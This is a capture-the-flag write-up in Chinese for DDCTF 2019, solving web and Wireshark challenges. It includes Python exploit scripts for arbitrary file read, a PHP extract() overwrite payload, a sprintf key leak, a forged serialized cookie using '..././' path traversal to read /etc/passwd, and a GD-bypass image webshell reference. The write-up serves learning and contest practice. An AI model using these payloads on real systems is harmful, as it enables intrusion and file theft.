---
title: 2019-DDCTF-writeup
date: 2019-04-19 14:00:12
toc: true
tags: 
- 2019-DDCTF-writeup
categories: 
- ctf 
---
这次比赛一共解出3题Web、1题Misc的流量分析和1个签到，总共拿到561分。
排名目前在224名。因为主办方现在还在ban掉作弊选手，所以还有上升空间（手动滑稽～）
![dd1](https://user-images.githubusercontent.com/38073810/56410132-9da24600-62ae-11e9-8ee1-ed886764039f.png)
## Web解题思路
### 一、滴～
![dd2](https://user-images.githubusercontent.com/38073810/56410361-6da77280-62af-11e9-8ed8-e1207357f4b1.png)
靶机：http://117.51.150.246
知识点：任意文件读取、加解密、脑洞、extract变量覆盖
#### 1、打开靶机
![image](https://user-images.githubusercontent.com/38073810/56410583-266db180-62b0-11e9-95a0-dea35b9cf65c.png)
#### 2、在URL中发现可能为任意文件读取，但是文件名被加密，然后我们先去解密
![image](https://user-images.githubusercontent.com/38073810/56410957-a47e8800-62b1-11e9-9062-a6f42be9f51d.png)
经过Base64解密-->Base64解密-->Base16解密 得到原目录名flag.jpg
#### 3、构造index.php
{% codeblock lang:python %}
import base64
import requests

u = 'index.php'

jpg = base64.b64encode(base64.b64encode("".join("{:02x}".format(ord(c)) for c in u).encode('utf-8'))).decode('utf-8')

r = requests.get('http://117.51.150.246/index.php', params={'jpg': jpg})

print(r.url)
print(r.text)
{% endcodeblock %}
运行后发现被base64加密过的数据,解密后得到index.php源代码
![image](https://user-images.githubusercontent.com/38073810/56411544-af3a1c80-62b3-11e9-9ffb-753e66bc2444.png)
![image](https://user-images.githubusercontent.com/38073810/56411746-5ae36c80-62b4-11e9-9f72-bf47be8a1ef9.png)
审计发现config会被转换成！,然后构造尝试多次无果。所以暂时放弃了。
后来继续又看了遍代码，在注释里面发现一个博客，浏览后发现此篇文章并没有什么用，但是在推荐里面发现一篇有用的文章
![image](https://user-images.githubusercontent.com/38073810/56411959-29b76c00-62b5-11e9-9729-ca87df0be002.png)
![image](https://user-images.githubusercontent.com/38073810/56413773-27581080-62bb-11e9-926f-9dcdcb28d994.png)
#### 4、构造practice.txt.swp
{% codeblock lang:python %}
import base64
import requests

 u = 'practice.txt.swp'

 jpg = base64.b64encode(base64.b64encode("".join("{:02x}".format(ord(c)) for c in u).encode('utf-8'))).decode('utf-8')

 r = requests.get('http://117.51.150.246/index.php', params={'jpg': jpg})

 print(r.url)
 print(r.text)
 {% endcodeblock %}
![image](https://user-images.githubusercontent.com/38073810/56412137-caa62700-62b5-11e9-8cce-c33bdec84bb6.png)
 运行后得到Base64加密过的数据，解密后得到
![image](https://user-images.githubusercontent.com/38073810/56412320-4acc8c80-62b6-11e9-89a9-5fa3f4be196e.png)
#### 5、构造f1ag!ddctf.php
{% codeblock lang:python %}
import base64
import requests

u = 'f1agconfigddctf.php'

jpg = base64.b64encode(base64.b64encode("".join("{:02x}".format(ord(c)) for c in u).encode('utf-8'))).decode('utf-8')

r = requests.get('http://117.51.150.246/index.php', params={'jpg': jpg})

print(r.url)
print(r.text)
{% endcodeblock %}
之前我们在index.php中可以通过审计代码得到config可以被替换为！所以我们在构造f1ag!ddctf.php时，注意把！替换为config
得到Base64加密过的数据，解密后得到
![image](https://user-images.githubusercontent.com/38073810/56412587-55d3ec80-62b7-11e9-9d02-3c714d4df416.png)
审计代码后发现可以利用extract变量覆盖
资料：http://www.w3school.com.cn/php/func_array_extract.asp
我们构造payload:http://117.51.150.246/f1ag!ddctf.php?uid=&k=1  最终得到flag
![image](https://user-images.githubusercontent.com/38073810/56413294-99c7f100-62b9-11e9-82f9-77c9d8e706ba.png)
### 二、WEB签到题
![image](https://user-images.githubusercontent.com/38073810/56414702-0b09a300-62be-11e9-8592-215823d406fe.png)
靶机:http://117.51.158.44/index.php
知识点：php代码审计、文本格式化、php反序列化
#### 1、查看js, didictf_username
![image](https://user-images.githubusercontent.com/38073810/56415105-45277480-62bf-11e9-8503-938ce3ca7efb.png)
#### 2、Burpsuite抓包，修改didictf_username为admin，得到目录
![6DD11375-1C41-494F-82F1-A4514A657B38](https://user-images.githubusercontent.com/38073810/56414665-e1e91280-62bd-11e9-923f-85c423939e56.png)
#### 3、访问app/fL2XID2i0Cdh.php,得到源码
{% codeblock lang:php %}

url:app/Application.php


Class Application {
    var $path = '';


    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        }else{
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace('../','',$path);
    $path=str_replace('..\\','',$path);
    return $path;
}

public function __destruct() {
    if(empty($this->path)) {
        exit();
    }else{
        $path = $this->sanitizepath($this->path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this->response($data=file_get_contents($path),'Congratulations');
    }
    exit();
}
}




url:app/Session.php



include 'Application.php';
class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = '';
    var $cookie_expiration			= 7200;
    var $cookie_name                = 'ddctf_id';
    var $cookie_path				= '';
    var $cookie_domain				= '';
    var $cookie_secure				= FALSE;
    var $activity                   = "DiDiCTF";


    public function index()
    {
	if(parent::auth()) {
            $this->get_key();
            if($this->session_read()) {
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                parent::response($data,'sucess');
            }else{
                $this->session_create();
                $data = 'DiDI Welcome you';
                parent::response($data,'sucess');
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this->cookie_name];
        if(!isset($session)) {
            parent::response("session not found",'error');
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
            return FALSE;
        }

        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }

        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
            parent::response('the ip addree not match'.'error');
            return FALSE;
        }
        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
            parent::response('the user agent not match','error');
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf->index();


{% endcodeblock %}
分析源码，在109行看到危险函数unserialize，44行file_get_contents
到这里大致可以猜到解题流程
session反序列化-->创建Application对象-->控制/path-->获取flag
#### 4、分析代码
![image](https://user-images.githubusercontent.com/38073810/56416875-c6cdd100-62c4-11e9-82a2-a2006dee1132.png)
从上可以知道签名规则md5(eancrykey+session)，所以我们只有得到eancrykey+session才能控制cookie。
分析eancrykey出现地点，得到如下两处
![image](https://user-images.githubusercontent.com/38073810/56417106-71de8a80-62c5-11e9-947d-4d43892a1c12.png)
![image](https://user-images.githubusercontent.com/38073810/56417155-9aff1b00-62c5-11e9-8fbb-fad006d6dafa.png)
由于不存在文件读取漏洞所以第一处暂时不可用，但是第二处可获取eancrykey
审计第二处发现sprintf函数，查阅用法：http://www.w3school.com.cn/php/func_string_sprintf.asp
构造payload：
![image](https://user-images.githubusercontent.com/38073810/56417422-75bedc80-62c6-11e9-8bc2-22e04f408610.png)
![image](https://user-images.githubusercontent.com/38073810/56417436-85d6bc00-62c6-11e9-9785-a6d32c5f4f95.png)
成功得到key
#### 5、构造session
分析Application
![image](https://user-images.githubusercontent.com/38073810/56417710-57a5ac00-62c7-11e9-9a85-4fc004ba1669.png)
发现代码有双层防护，保证path安全。
sanitizepath可以使用双写绕过
``` bash
Payload:../
双写后：..././
```
再看限制字符为18。
此时尝试读取/etc/passwd。计算其长度，为10。此时我们可以构造如下：
``` bash
Payload:/etc/../etc/passwd
双写后:/etc/..././etc/passwd
序列化后:O:11:"Application":1:{s:4:"path";s:21:"/etc/..././etc/passwd";}
按规则签名后:O%3a11%3a"Application"%3a1%3a{s%3a4%3a"path"%3bs%3a21%3a"/etc/..././etc/passwd"%3b}75c51ff78b04d77138ca58f797dedc0a;
```
![image](https://user-images.githubusercontent.com/38073810/56418102-8c663300-62c8-11e9-93bb-dcd09e00c8a1.png)
此时我们读取了/etc/passwd
最终在 ../config/flag.txt读到flag
![image](https://user-images.githubusercontent.com/38073810/56418180-c6373980-62c8-11e9-95c4-7b2bea1d74c5.png)
### 三、Upload-IMG
![image](https://user-images.githubusercontent.com/38073810/56418271-01396d00-62c9-11e9-9a1c-9aaadd5beb6a.png)
靶机：http://117.51.148.166/upload.php
知识点：GD库渲染绕过
#### 1、上传文件
首先随便上传一张jpg图片
然后把上传成功的图片下载到本地
#### 2、文件对比
利用在线图片对比：http://www.newjson.com/Static/Tools/Diff.html
![image](https://user-images.githubusercontent.com/38073810/56418545-c257e700-62c9-11e9-8a5d-ac903fddf422.png)
然后发现文件被调用GD库渲染过了，所以我们来绕过GD库
#### 3、生成payload并上传
我们直接使用大牛的Payload脚本：https://github.com/Medicean/VulApps/blob/master/c/cmseasy/1/jpg_payload.php
![image](https://user-images.githubusercontent.com/38073810/56418862-da7c3600-62ca-11e9-9805-e53358e94223.png)
#### 4、Get Flag
![image](https://user-images.githubusercontent.com/38073810/56419064-8faeee00-62cb-11e9-9ed8-c9412fa5448c.png)
## Misc解题思路
### 一、Wireshark
![image](https://user-images.githubusercontent.com/38073810/56419440-d5b88180-62cc-11e9-8841-93adcc1fe2dc.png)
#### 1、下载文件
用Wireshark打开，然后我们直接先导出http对象到本地
![64BC6486-5381-44C5-8EA0-1ADE9B17A850](https://user-images.githubusercontent.com/38073810/56420096-39dc4500-62cf-11e9-82bd-7bc1018d440d.png)
![7704BCEE-E57B-4A73-82E2-E2248211DAA4](https://user-images.githubusercontent.com/38073810/56420099-3e086280-62cf-11e9-8358-df1c645d7d83.png)
![image](https://user-images.githubusercontent.com/38073810/56420285-ea4a4900-62cf-11e9-9e9a-6c21ae0f1f25.png)
#### 2、文件分析
我们首先用notepade打开%5c(1)，发现他是一张png图片，然后把png头文件格式之前全部删除，保存之后修改后缀为.png
![E2210F4A-55C6-4B25-9060-33DD84E1AF4B](https://user-images.githubusercontent.com/38073810/56420420-79576100-62d0-11e9-94b5-7f55ecb987df.png)
![EA28F0CF-DB21-4068-9900-AF81BE4967F6](https://user-images.githubusercontent.com/38073810/56420426-7bb9bb00-62d0-11e9-8033-1fab298125ec.png)
打开后根据经验判断，图片高度应该被修改过了，我们把图片高度稍微调高一点，得到key
![5124FCA7-ED8A-4A3C-8D3A-6A0C868560D5](https://user-images.githubusercontent.com/38073810/56420495-bf142980-62d0-11e9-8634-ff79ec22cfc2.png)
![1C7AC9CC-7F60-4ADD-AE93-59B14C44052D](https://user-images.githubusercontent.com/38073810/56420509-caffeb80-62d0-11e9-938b-9986e8aa3f30.png)
然后我们继续用notepade打开%5c(4)，发现也是一张png图片，然后把png头文件格式之前全部删除，保存之后修改后缀为.png
![0E25F7EF-52A3-40DF-9EB1-9C3A3447D0E0](https://user-images.githubusercontent.com/38073810/56420579-229e5700-62d1-11e9-8015-5e603f2493cc.png)
![BFB7E879-0842-4FB2-866E-9D28EFDB354C](https://user-images.githubusercontent.com/38073810/56420583-2631de00-62d1-11e9-94ef-94ffbcae77cb.png)
到这里基本就能猜到是图片加密隐藏信息
当然如果猜不出我们也可以从这里看出加密的网址
![BE6D35D6-BAA4-4073-B8A0-3DC6DF29FB3A](https://user-images.githubusercontent.com/38073810/56420643-6a24e300-62d1-11e9-8cb2-8d7065434f3a.png)
#### 3、图片解密
在线图片添加/解密隐藏信息(隐写术)工具：http://tools.jb51.net/aideddesign/img_add_info
![479F8B5A-8E56-43D7-AB7C-D5EF368433B4](https://user-images.githubusercontent.com/38073810/56420660-7872ff00-62d1-11e9-8970-c896fbcbc723.png)
![F0AECFEE-C793-4B54-B716-1E0E22E714EA](https://user-images.githubusercontent.com/38073810/56420667-7ad55900-62d1-11e9-8c92-84712473ed11.png)



